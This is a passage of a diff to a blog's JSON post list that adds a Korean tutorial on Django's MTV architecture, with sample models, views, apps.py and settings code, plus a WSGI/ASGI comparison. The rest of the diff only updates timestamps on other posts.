있다.</p>\n<table>\n<thead>\n<tr>\n<th>개념</th>\n<th>Django에서</th>\n<th>역할</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Model</strong></td>\n<td><code>models.py</code></td>\n<td>DB 스키마 정의, 데이터 접근, 비즈니스 로직</td>\n</tr>\n<tr>\n<td><strong>Template</strong></td>\n<td><code>templates/*.html</code></td>\n<td>화면 렌더링. context 데이터를 HTML로 변환</td>\n</tr>\n<tr>\n<td><strong>View</strong></td>\n<td><code>views.py</code></td>\n<td>요청을 받아 데이터 조회/처리 후 Template에 context 전달</td>\n</tr>\n<tr>\n<td><strong>URL Dispatcher</strong></td>\n<td><code>urls.py</code></td>\n<td>URL 패턴 → View 함수 매핑</td>\n</tr>\n</tbody></table>\n<h2>Model — 데이터와 로직의 집합</h2>\n<pre><code class=\"language-python\"># articles/models.py\nfrom django.db import models\n\nclass Article(models.Model):\n    title = models.CharField(max_length=200)\n    body = models.TextField()\n    author = models.ForeignKey(&quot;auth.User&quot;, on_delete=models.CASCADE)\n    created_at = models.DateTimeField(auto_now_add=True)\n    is_published = models.BooleanField(default=False)\n\n    class Meta:\n        ordering = [&quot;-created_at&quot;]\n        verbose_name = &quot;기사&quot;\n\n    def __str__(self):\n        return self.title\n\n    def publish(self):\n        &quot;&quot;&quot;비즈니스 로직도 모델에 포함&quot;&quot;&quot;\n        self.is_published = True\n        self.save()\n</code></pre>\n<p>Model에서 정의한 내용이 파생시키는 것들:</p>\n<pre><code class=\"language-mermaid\">%% desc: 모델 하나에서 Admin, Form, Migration, API Serializer가 자동 파생되는 DRY 원칙\nflowchart TD\n  MODEL[&quot;Article 모델\\n(models.py)&quot;]\n\n  ADMIN[&quot;Admin 인터페이스\\n(admin.site.register)&quot;]\n  FORM[&quot;ModelForm\\n(자동 필드 검증)&quot;]\n  MIGRATION[&quot;Migration 파일\\n(스키마 이력)&quot;]\n  SERIAL[&quot;ModelSerializer\\n(DRF, 자동 직렬화)&quot;]\n\n  MODEL --&gt; ADMIN &amp; FORM &amp; MIGRATION &amp; SERIAL\n</code></pre>\n<h2>Template — 화면 렌더링 전용</h2>\n<p>Django Template Language(DTL)는 의도적으로 <strong>제한된</strong> 언어다.<sup id=\"fnref-dtl-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-dtl-docs\" aria-label=\"각주 2\">[2]</a></sup></p>\n<pre><code class=\"language-django\">{# articles/templates/articles/detail.html #}\n{% extends &quot;base.html&quot; %}\n\n{% block content %}\n  &lt;h1&gt;{{ article.title }}&lt;/h1&gt;\n  &lt;p&gt;{{ article.body }}&lt;/p&gt;\n\n  {% if article.is_published %}\n    &lt;span&gt;게시됨&lt;/span&gt;\n  {% endif %}\n\n  {% for comment in article.comments.all %}\n    &lt;p&gt;{{ comment.text }}&lt;/p&gt;\n  {% endfor %}\n{% endblock %}\n</code></pre>\n<p>DTL의 설계 원칙: &quot;프레젠테이션 관련 결정만 할 수 있을 정도의 로직만 허용한다.&quot;<br>DB 삭제, 파일 접근 같은 사이드이펙트 있는 작업은 Template에서 불가능하다.</p>\n<blockquote>\n<p>기본 Template 엔진은 DTL이지만, Jinja2로 교체 가능하다. Loose Coupling의 실제 사례다.</p>\n</blockquote>\n<h2>View — 요청 처리의 핵심</h2>\n<p>View는 <code>HttpRequest</code>를 받아 <code>HttpResponse</code>를 반환하는 callable이다.<sup id=\"fnref-view-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-view-docs\" aria-label=\"각주 3\">[3]</a></sup></p>\n<pre><code class=\"language-python\"># articles/views.py\n\n# Function-Based View (FBV) — 단순하고 명시적\ndef article_list(request):\n    articles = Article.objects.filter(is_published=True)\n    return render(request, &quot;articles/list.html&quot;, {&quot;articles&quot;: articles})\n\n# Class-Based View (CBV) — 재사용 가능한 공통 패턴\nfrom django.views.generic import ListView, DetailView\n\nclass ArticleListView(ListView):\n    model = Article\n    queryset = Article.objects.filter(is_published=True)\n    template_name = &quot;articles/list.html&quot;\n    context_object_name = &quot;articles&quot;\n    paginate_by = 20\n</code></pre>\n<p>FBV vs CBV:</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>FBV</th>\n<th>CBV</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>코드 스타일</td>\n<td>함수</td>\n<td>클래스 (상속)</td>\n</tr>\n<tr>\n<td>가독성</td>\n<td>높음 (선형적)</td>\n<td>낮음 (메서드 분산)</td>\n</tr>\n<tr>\n<td>재사용</td>\n<td>mixins 필요</td>\n<td>상속으로 쉬움</td>\n</tr>\n<tr>\n<td>적합한 경우</td>\n<td>단순 뷰, 복잡한 커스텀 로직</td>\n<td>CRUD 반복 패턴</td>\n</tr>\n</tbody></table>\n<h2>Project vs App — 경계 나누는 기준</h2>\n<pre><code class=\"language-mermaid\">%% desc: Project는 설정 허브, App은 독립 기능 단위 — 앱은 여러 프로젝트에서 재사용 가능\nflowchart TD\n  subgraph PROJECT[&quot;Django Project (mysite/)&quot;]\n    SETTINGS[&quot;settings.py&quot;]\n    ROOT_URL[&quot;urls.py (root)&quot;]\n    WSGI_FILE[&quot;wsgi.py&quot;]\n    MANAGE[&quot;manage.py&quot;]\n  end\n\n  subgraph APPS[&quot;Django Apps&quot;]\n    BLOG[&quot;blog app\\nmodels.py\\nviews.py\\nurls.py\\ntemplates/\\nmigrations/\\napps.py&quot;]\n    AUTH_APP[&quot;accounts app\\n사용자 인증&quot;]\n    SHOP_APP[&quot;shop app\\n상품/주문&quot;]\n  end\n\n  PROJECT --&gt; APPS\n\n  REUSE[&quot;다른 Project에서도\\n이 앱을 그대로 재사용 가능\\n(pip install my-blog-app)&quot;]\n  BLOG -.-&gt; REUSE\n</code></pre>\n<p><strong>앱 분리 기준</strong>: 한 앱이 &quot;하나의 명확한 역할&quot;을 담당해야 한다. 기능이 독립적으로 존재할 수 있는가? 다른 프로젝트에 복사해서 쓸 수 있는가?</p>\n<h3>apps.py — 앱 설정과 등록</h3>\n<pre><code class=\"language-python\"># blog/apps.py\nfrom django.apps import AppConfig\n\nclass BlogConfig(AppConfig):\n    default_auto_field = &quot;django.db.models.BigAutoField&quot;\n    name = &quot;blog&quot;\n    verbose_name = &quot;블로그&quot;\n\n    def ready(self):\n        &quot;&quot;&quot;앱이 로드될 때 실행 — 시그널 등록 등&quot;&quot;&quot;\n        import blog.signals  # noqa\n</code></pre>\n<pre><code class=\"language-python\"># settings.py\nINSTALLED_APPS = [\n    &quot;django.contrib.admin&quot;,\n    &quot;django.contrib.auth&quot;,\n    ...\n    &quot;blog.apps.BlogConfig&quot;,   # 앱 등록\n]\n</code></pre>\n<p><code>INSTALLED_APPS</code>에 등록돼야 모델·Admin·시그널·관리명령어가 활성화된다.</p>\n<h2>settings.py — 모든 것의 허브</h2>\n<p><code>settings.py</code>는 INI나 YAML이 아니라 <strong>Python 모듈</strong>이다.<sup id=\"fnref-settings-docs\" style=\"scroll-margin-top: 96px;\"><a href=\"#fn-settings-docs\" aria-label=\"각주 4\">[4]</a></sup></p>\n<pre><code class=\"language-python\"># settings.py는 실행되는 Python 코드\nimport os\n\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n# 동적 설정 가능\nINSTALLED_APPS = [\n    &quot;django.contrib.admin&quot;,\n    ...\n]\nif os.environ.get(&quot;ENABLE_DEBUG_TOOLBAR&quot;):\n    INSTALLED_APPS += [&quot;debug_toolbar&quot;]\n</code></pre>\n<p>주요 설정:</p>\n<table>\n<thead>\n<tr>\n<th>설정키</th>\n<th>역할</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>INSTALLED_APPS</code></td>\n<td>활성화된 앱 목록 (모델·Admin·시그널 활성화)</td>\n</tr>\n<tr>\n<td><code>MIDDLEWARE</code></td>\n<td>요청/응답 파이프라인 구성</td>\n</tr>\n<tr>\n<td><code>DATABASES</code></td>\n<td>DB 연결 설정</td>\n</tr>\n<tr>\n<td><code>TEMPLATES</code></td>\n<td>템플릿 엔진과 경로</td>\n</tr>\n<tr>\n<td><code>ROOT_URLCONF</code></td>\n<td>URL 설정 파일 경로</td>\n</tr>\n<tr>\n<td><code>STATIC_URL</code></td>\n<td>정적 파일 URL</td>\n</tr>\n<tr>\n<td><code>SECRET_KEY</code></td>\n<td>암호화·세션·CSRF에 사용</td>\n</tr>\n<tr>\n<td><code>DEBUG</code></td>\n<td>개발/운영 모드 분리</td>\n</tr>\n</tbody></table>\n<h2>WSGI vs ASGI</h2>\n<pre><code class=\"language-mermaid\">%% desc: WSGI는 동기 1요청=1스레드, ASGI는 비동기 이벤트 루프로 다수 동시 처리\nflowchart LR\n  subgraph WSGI[&quot;WSGI (동기)&quot;]\n    W_REQ1[&quot;요청 1&quot;] --&gt; W_T1[&quot;스레드 1\\n처리 중...&quot;]\n    W_REQ2[&quot;요청 2&quot;] --&gt; W_T2[&quot;스레드 2\\n처리 중...&quot;]\n    W_REQ3[&quot;요청 3&quot;] --&gt; W_T3[&quot;스레드 3 (대기)&quot;]\n    W_T1 &amp; W_T2 &amp; W_T3 --&gt; W_RES[&quot;응답&quot;]\n  end\n\n  subgraph ASGI[&quot;ASGI (비동기)&quot;]\n    A_REQ1[&quot;요청 1&quot;] --&gt; A_LOOP[&quot;이벤트 루프\\n(단일 프로세스)&quot;]\n    A_REQ2[&quot;요청 2&quot;] --&gt; A_LOOP\n    A_REQ3[&quot;요청 3&quot;] --&gt; A_LOOP\n    A_LOOP -- &quot;I/O 대기 중 다른 요청 처리&quot; --&gt; A_RES[&quot;응답&quot;]\n  end\n</code></pre>\n<pre><code class=\"language-python\"># config/asgi.py\nimport os\nfrom django.core.asgi import get_asgi_application\n\nos.environ.setdefault(&quot;DJANGO_SETTINGS_MODULE&quot;, &quot;config.settings.local&quot;)\napplication = get_asgi_application()\n</code></pre>\n<p><strong>주의</strong>: ASGI 성능을 100% 이용하려면 <strong>미들웨어 전체</strong>가 async-compatible이어야 한다. 단 하나의 sync-only 미들웨어가 있으면 Django가 자동으로 스레드를 쓰게 돼 ASGI 이점이 사라진다.</p>\n<p>Django의 async 지원 진화:</p>\n<table>\n<thead>\n<tr>\n<th>버전</th>\n<th>변화</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>3.0</td>\n<td>ASGI 진입점 지원 시작</td>\n</tr>\n<tr>\n<td>3.1</td>\n<td>async FBV / CBV 지원</td>\n</tr>\n<tr>\n<td>4.1</td>\n<td>async ORM (<code>aget()</code>, <code>acreate()</code> 등)</td>\n</tr>\n<tr>\n<td>5.0</td>\n<td>async 시그널, async 인증</td>\n</tr>\n<tr>\n<td><strong>5.2 (현재 LTS)</strong></td>\n<td>async 전반 성숙 단계</td>\n</tr>\n</tbody></table>\n<h2>관련 글</h2>\n<ul>\n<li><a href=\"/post/django-overview\">Django 프레임워크 큰 그림</a>: 전체 철학과 구조 개요</li>\n<li><a href=\"/post/django-lifecycle\">Django 요청-응답 라이프사이클</a>: MTV 각 레이어가 요청 처리에서 어떤 순서로 개입하는가</li>\n<li><a href=\"/post/django-orm-deep\">Django ORM — QuerySet과 지연 실행</a>: Model 레이어 심층 탐구</li>\n</ul>\n<hr>\n<h2>참고/주석</h2>\n<ol>\n<li id=\"fn-django-faq\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/faq/general/#django-appears-to-be-a-mvc-framework-but-you-call-the-controller-the-view-and-the-view-the-template\" target=\"_blank\">FAQ: MVC — Django Docs</a> <a href=\"#fnref-django-faq\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-dtl-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/ref/templates/language/\" target=\"_blank\">The Django template language — Django Docs</a> <a href=\"#fnref-dtl-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-view-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/topics/http/views/\" target=\"_blank\">Writing views — Django Docs</a> <a href=\"#fnref-view-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n<li id=\"fn-settings-docs\" style=\"scroll-margin-top: 96px;\">Django Project, <a href=\"https://docs.djangoproject.com/en/5.2/topics/settings/\" target=\"_blank\">Django settings — Django Docs</a> <a href=\"#fnref-settings-docs\" aria-label=\"본문으로 돌아가기\">↩</a></li>\n</ol>\n",
+    "coverImage": null,
+    "category": "study/backend/django",
+    "tags": [
+      "Django",
+      "MTV",
+      "MVC",
+      "Architecture",
+      "Project",
+      "App",
+      "AppConfig",
+      "WSGI",
+      "ASGI",
+      "Settings"
+    ],
+    "author": "Seobway",
+    "readTime": 12,
+    "views": 0,
+    "featured": false,
+    "createdAt": "2026-03-27T00:00:00.000Z",
+    "updatedAt": "2026-03-27T03:51:25.141Z"
+  },
+  {
     "id": "docker-compose-django",
     "title": "Docker Compose로 Django 5개 서비스 띄우기",
     "slug": "docker-compose-django",
@@ -22,7 +154,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.771Z"
+    "updatedAt": "2026-03-27T03:51:25.160Z"
   },
   {
     "id": "docker-compose-basics",
@@ -46,7 +178,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.770Z"
+    "updatedAt": "2026-03-27T03:51:25.159Z"
   },
   {
     "id": "docker-basics",
@@ -69,7 +201,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.769Z"
+    "updatedAt": "2026-03-27T03:51:25.159Z"
   },
   {
     "id": "django-version-compatibility",
@@ -94,7 +226,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.760Z"
+    "updatedAt": "2026-03-27T03:51:25.150Z"
   },
   {
     "id": "django-settings",
@@ -119,7 +251,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.762Z"
+    "updatedAt": "2026-03-27T03:51:25.153Z"
   },
   {
     "id": "django-migration",
@@ -144,7 +276,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.757Z"
+    "updatedAt": "2026-03-27T03:51:25.146Z"
   },
   {
     "id": "celery-worker",
@@ -171,7 +303,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.766Z"
+    "updatedAt": "2026-03-27T03:51:25.156Z"
   },
   {
     "id": "celery-django",
@@ -197,7 +329,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.767Z"
+    "updatedAt": "2026-03-27T03:51:25.158Z"
   },
   {
     "id": "celery-broker",
@@ -223,7 +355,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.765Z"
+    "updatedAt": "2026-03-27T03:51:25.155Z"
   },
   {
     "id": "celery-beat",
@@ -247,7 +379,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-26T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.763Z"
+    "updatedAt": "2026-03-27T03:51:25.154Z"
   },
   {
     "id": "unicast-and-broadcast",
@@ -271,7 +403,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.782Z"
+    "updatedAt": "2026-03-27T03:51:25.172Z"
   },
   {
     "id": "micro-tcp-udp",
@@ -296,7 +428,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.799Z"
+    "updatedAt": "2026-03-27T03:51:25.186Z"
   },
   {
     "id": "micro-tcp-ip-model",
@@ -319,7 +451,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.797Z"
+    "updatedAt": "2026-03-27T03:51:25.184Z"
   },
   {
     "id": "micro-protocol",
@@ -342,7 +474,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.796Z"
+    "updatedAt": "2026-03-27T03:51:25.183Z"
   },
   {
     "id": "micro-osi-7layer",
@@ -370,7 +502,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.794Z"
+    "updatedAt": "2026-03-27T03:51:25.182Z"
   },
   {
     "id": "micro-network-view",
@@ -395,7 +527,7 @@
     "views": 0,
     "featured": true,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.776Z"
+    "updatedAt": "2026-03-27T03:51:25.168Z"
   },
   {
     "id": "micro-network-traffic",
@@ -420,7 +552,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.792Z"
+    "updatedAt": "2026-03-27T03:51:25.180Z"
   },
   {
     "id": "micro-ip-arp",
@@ -445,7 +577,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.790Z"
+    "updatedAt": "2026-03-27T03:51:25.177Z"
   },
   {
     "id": "micro-http-https",
@@ -472,7 +604,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.787Z"
+    "updatedAt": "2026-03-27T03:51:25.176Z"
   },
   {
     "id": "micro-encapsulation",
@@ -498,7 +630,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.784Z"
+    "updatedAt": "2026-03-27T03:51:25.174Z"
   },
   {
     "id": "ixp-internet-exchange-point",
@@ -521,7 +653,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.780Z"
+    "updatedAt": "2026-03-27T03:51:25.171Z"
   },
   {
     "id": "isp-internet-service-provider",
@@ -545,7 +677,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.779Z"
+    "updatedAt": "2026-03-27T03:51:25.170Z"
   },
   {
     "id": "circuit-vs-packet-switching",
@@ -567,7 +699,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.778Z"
+    "updatedAt": "2026-03-27T03:51:25.170Z"
   },
   {
     "id": "cdn-content-delivery-network",
@@ -590,7 +722,7 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-25T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.777Z"
+    "updatedAt": "2026-03-27T03:51:25.168Z"
   },
   {
     "id": "macro-network-view",
@@ -613,7 +745,7 @@
     "views": 0,
     "featured": true,
     "createdAt": "2026-03-19T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.776Z"
+    "updatedAt": "2026-03-27T03:51:25.167Z"
   },
   {
     "id": "gitlab-cicd-guide",
@@ -637,7 +769,7 @@
     "views": 0,
     "featured": true,
     "createdAt": "2026-03-19T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.773Z"
+    "updatedAt": "2026-03-27T03:51:25.164Z"
   },
   {
     "id": "gitlab-artifacts-vs-cache",
@@ -660,6 +792,6 @@
     "views": 0,
     "featured": false,
     "createdAt": "2026-03-19T00:00:00.000Z",
-    "updatedAt": "2026-03-26T22:58:24.772Z"
+    "updatedAt": "2026-03-27T03:51:25.161Z"
   }
 ]
